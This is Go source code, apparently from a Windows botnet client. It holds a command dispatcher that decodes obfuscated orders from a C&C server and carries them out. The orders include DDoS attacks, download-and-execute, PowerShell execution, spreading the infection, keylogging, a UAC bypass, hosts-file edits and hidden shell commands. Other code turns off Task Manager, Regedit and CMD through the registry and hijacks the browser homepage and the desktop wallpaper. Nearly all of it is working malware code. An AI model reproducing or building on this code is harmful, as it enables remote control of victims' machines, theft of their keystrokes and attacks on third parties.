// Package components icludes functionalities required for the bot
//Encode Data = Text -> Obfuscate -> Base64
//Decode Data = Deobfuscate -> Base64 -> Text
package components

import (
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

var location, _ = time.LoadLocation("")

//Checks data's MD5 with the MD5 of LAST in registry, if the same it ingnores, if diffrent it decodeds the command and parces the commands information

func commandParce(data string) {
	val, _ := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")

	if md5Hash(data) != lastCommand { //See if old command
		// fmt.Println("Hello")
		if md5Hash(data) != val {

			// newDebugUpdate("Command HASH: " + md5Hash(data))
			// newDebugUpdate("Val Data: " + val)
			registryToy(data, 4)

			gettime := strings.Split(data, "||")

			then, err := time.ParseInLocation(time.RFC1123Z, gettime[0], location)
			if err != nil {
				return
			}

			duration := time.Since(then)
			if duration.Hours() >= 24 {
				//NewDebugUpdate("Command to old, ingoring.")
			} else {
				decode := base64Decode(deobfuscate(gettime[1])) //Decodes the command
				tmp := strings.Split(decode, "|")               //parses the command information

				if tmp[0] == "000" || tmp[0] == myUID || strings.Contains(tmp[0], myUID) { //If all bots, just me, some bots and me
					didlastCommand = false
					if tmp[1] == "0x0" {
						lastCommand = md5Hash(data)
						os.Exit(0)
					} else if tmp[1] == "0x1" {
						if len(tmp) == 4 { //check to make sure the command is argumented right...
							openURL(tmp[2], tmp[3]) //4
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "0x2" {
						if len(tmp) == 4 {
							startEXE(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "0x3" {
						if len(tmp) == 6 {
							i, _ := strconv.Atoi(tmp[4])
							i2, _ := strconv.Atoi(tmp[5])
							ddosAttc(tmp[2], tmp[3], i, i2)
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "0x4" {
						setDDoSMode(false)
						lastCommand = md5Hash(data)
					} else if tmp[1] == "0x5" {
						downloadAndRun(tmp[2], tmp[3], tmp[4], tmp[5], tmp[6])
						lastCommand = md5Hash(data)
					} else if tmp[1] == "0x6" {
						if len(tmp) == 4 {
							runPowershell(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "0x7" {
						if len(tmp) == 3 {
							infection(tmp[2])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "0x8" {
						startServer()
						lastCommand = md5Hash(data)
					} else if tmp[1] == "0x9" {
						if len(tmp) == 4 {
							editPage(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x0" {
						if len(tmp) == 4 {
							hideProcWindow(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x1" {
						seedTorrent(tmp[2])
						lastCommand = md5Hash(data)
					} else if tmp[1] == "1x2" {
						if len(tmp) == 3 {
							powerOptions(tmp[2])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x3" {
						if len(tmp) == 3 {
							setHomepage(tmp[2])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x4" {
						if len(tmp) == 4 {
							setBackground(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x5" {
						if len(tmp) == 4 {
							if tmp[3] == "0" {
								editHost(tmp[2], false)
								lastCommand = md5Hash(data)
							} else {
								editHost(tmp[2], true)
								lastCommand = md5Hash(data)
							}
						}
					} else if tmp[1] == "1x6" {
						if len(tmp) == 3 {
							if tmp[2] == "yes" {
								lastCommand = md5Hash(data)
								uninstall()
							}
						}
					} else if tmp[1] == "1x7" {
						if len(tmp) == 3 {
							i3, _ := strconv.Atoi(tmp[2])
							_, _ = openPort(i3)
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "1x8" {
						handleScripters(tmp[2], tmp[3])
						lastCommand = md5Hash(data)
					} else if tmp[1] == "1x9" {
						if len(tmp) == 3 {
							run(tmp[2])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "2x0" {
						if len(tmp) == 4 {
							proxSrvLoad(tmp[2], tmp[3])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "2x1" {
						if len(tmp) == 6 {
							filePush(tmp[2], tmp[3], tmp[4], tmp[5])
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "2x2" {
						lastCommand = md5Hash(data)
						kill(tmp[2])
					} else if tmp[1] == "2x3" {
						if len(tmp) == 5 {
							lastCommand = md5Hash(data)
							update(tmp[2], tmp[3], tmp[4])
						}
					} else if tmp[1] == "2x4" {
						if !isKeyLogging {
							setKeyLoggerMode(true)
							startLogger(0)
							lastCommand = md5Hash(data)
						} else {
							setKeyLoggerMode(false)
							lastCommand = md5Hash(data)
						}
					} else if tmp[1] == "refresh" {
						//Tell Bot to send updated information about itself to the C&C
					} else {
						//NewDebugUpdate("Unknown Command Received...")
					}
					didlastCommand = true
				} //check if gettime[0] = currentTime.Format(time.RFC1123Z)
			}
		}
	}
}

func openURL(URL string, mode string) { //Opens a URL
	if mode == "0" {
		rsp, err := http.Get(URL)
		if err != nil {
		}
		defer rsp.Body.Close()
	} else { //visable
		exec.Command("cmd", "/c", "start", URL).Start()
	}
}

func startEXE(name string, uac string) { //Start an exe; example calc
	if strings.Contains(name, ".exe") {
		if uac == "0" {
			binary, _ := exec.LookPath(name)
			exec.Command(binary).Run()
		} else {
			binary, _ := exec.LookPath(name)
			uacBypass(binary)
		}
	}
}

func powerOptions(mode string) {
	if mode == "0" {
		run("shutdown -s -t 00")
	} else if mode == "1" {
		run("shutdown -r -t 00")
	} else if mode == "2" {
		run("shutdown -l -t 00")
	}
}

func registryToy(val string, opt int) {
	if opt == 0 { //TaskMngr
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", val) //0 = on|1 = off
	} else if opt == 1 { //Regedit
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", val) //0 = on|1 = off
	} else if opt == 2 { //CMD
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", val) //0 = on|1 = off
	} else if opt == 3 { //Bot ReMaster
		_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER")                //Delete old
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER", obfuscate(val)) //Write new
	} else if opt == 4 { //Change Last known command
		//_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")              //Delete old
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST", md5Hash(val)) //Write new

	}
}

func setBackground(mode string, data string) {
	if mode == "0" { //http.GET
		n := randomString(5, false)
		output, err := os.Create(tmpPath + n + ".jpg")
		defer output.Close()
		response, _ := http.Get(data)
		if err != nil {
		}
		defer response.Body.Close()
		_, err = io.Copy(output, response.Body)
		if err == nil {
			ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
			if ret == 1 {
			}
		}
	} else { //Base64
		n := randomString(5, false)
		Image, _ := os.Create(tmpPath + n + ".jpg")
		DecodedImage, _ := base64.StdEncoding.DecodeString(data)
		Image.WriteString(string(DecodedImage))
		Image.Close()
		ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
		if ret == 1 {
		}
	}
}

func setHomepage(url string) {
	_ = writeRegistryKey(registry.CURRENT_USER, homepagePath, "Start Page", url)
}

func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		// newDebugUpdate("Run: " + err.Error())
	}
}

func kill(name string) { //Kill("Tool.exe")
	c := exec.Command("cmd", "/C", "taskkill /F /IM "+name)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		// newDebugUpdate("Kill: " + err.Error())
	}
}
